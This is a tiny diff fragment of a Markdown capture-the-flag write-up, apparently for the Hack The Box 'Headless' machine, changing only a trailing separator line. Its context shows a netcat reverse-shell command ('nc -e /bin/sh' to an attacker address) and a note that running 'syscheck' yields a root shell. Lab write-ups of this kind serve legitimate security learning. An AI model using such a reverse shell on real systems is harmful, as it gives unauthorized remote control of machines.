@@ -60,4 +60,4 @@ nc -e '/bin/sh' 10.10.14.65 7878
 Run `syscheck` and get root shell.
 ![alt text](/posts/headless-htb/image-6.png)
 
-
+---
